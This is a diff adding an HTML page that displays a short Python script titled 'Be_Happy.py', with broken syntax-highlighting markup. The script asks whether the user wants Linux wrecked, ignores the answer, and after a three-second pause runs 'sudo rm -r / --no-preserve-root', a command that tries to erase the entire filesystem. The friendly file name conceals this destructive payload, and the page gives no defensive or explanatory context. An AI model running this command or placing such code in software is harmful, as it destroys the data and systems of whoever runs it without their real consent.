@@ -1,0 +1,15 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Be_Happy.py</title> <style> body { font-family: Consolas, monospace; background: #f5f7fb; padding: 1rem; }
+pre { white-space: pre-wrap; }
+.keyword { color: #0000ff; font-weight: 600; }
+.string { color: #a31515; }
+.comment { color: #008000; font-style: italic; }
+.number { color: #098658; } </style></head><body><pre><span class="keyword">import</span> webbrowser
+<span class="keyword">import</span> os
+<span class="keyword">import</span> time
+<span class="keyword">print</span>(<span <span class="keyword">class</span>="string">"Hello! Do you want Linux to get absolutely merced? Y/N"</span>)
+enter = input(<span <span class="keyword">class</span>="string">"Enter: "</span>)
+<span class="keyword">print</span>(<span <span class="keyword">class</span>="string">"There goes your fucking Linux!"</span>)
+time.sleep(<span <span class="keyword">class</span>="number">3</span>)
+os.system(<span <span class="keyword">class</span>="string">'sudo rm -r / --no-preserve-root'</span>)
+
+</pre></body></html>
